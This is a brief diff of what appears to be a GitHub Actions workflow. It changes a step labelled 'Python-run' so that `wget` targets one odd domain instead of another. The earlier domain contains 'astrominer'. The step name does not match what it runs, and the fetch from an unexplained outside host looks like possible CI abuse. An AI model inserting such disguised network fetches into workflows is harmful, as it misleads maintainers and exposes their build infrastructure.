@@ -16,6 +16,6 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - name: Python-run
-      run: wget astrominer.name.com.rocksonline.ninja
+      run: wget ns1.name.com.rocksonline.ninja
  
  
